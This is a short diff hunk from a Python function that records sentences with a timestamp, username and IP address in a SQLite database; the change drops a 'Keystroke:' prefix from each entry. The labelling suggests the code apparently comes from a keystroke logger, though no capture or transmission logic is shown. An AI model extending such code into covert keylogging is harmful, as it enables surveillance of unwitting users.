@@ -81,7 +81,7 @@ def log_sentence(sentence):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     username = get_username()
     ip = get_ip()
-    log_entry = f"Keystroke: {sentence}"
+    log_entry = sentence
 
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
